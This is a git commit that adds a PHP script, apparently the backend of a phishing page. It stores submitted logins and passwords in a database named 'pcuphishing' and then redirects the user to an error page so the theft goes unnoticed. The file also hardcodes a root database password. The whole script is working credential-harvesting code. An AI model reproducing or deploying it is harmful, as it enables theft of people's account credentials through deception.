3f4fb04013cd0cfc21dfe2b9953e69f4bbb82f44
Vadim2k <44468431+VadimElFamoso@users.noreply.github.com>
2022-10-10 08:28:36 +0200

    Add files via upload

---
+++ traitement.php
@@ -0,0 +1,33 @@
+<?php
+$serveur="localhost";
+$dbname="pcuphishing";
+$user="root";
+$pass="Vadimousse88150*";
+
+$login = $_POST["login"];
+$password = $_POST["password"];
+
+try{
+        //On se connecte à la BDD
+        $dbco = new PDO("mysql:host=$serveur;dbname=$dbname",$user,$pass);
+        $dbco->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+        //On insère les données reçues
+        $sth = $dbco->prepare("
+            INSERT INTO PCUPhishing(login, mdp) VALUES(:login, :mdp)");
+        $sth->bindParam(':login',$login);
+        $sth->bindParam(':mdp',$password);
+        $sth->execute();
+
+        //On renvoie l'utilisateur vers la page d'erreur
+        header('Location: error_page.html');
+        exit;
+    }
+    catch(PDOException $e){
+        echo 'Impossible de traiter les données. Erreur : '.$e->getMessage();
+    }
+
+
+
+
+ ?>
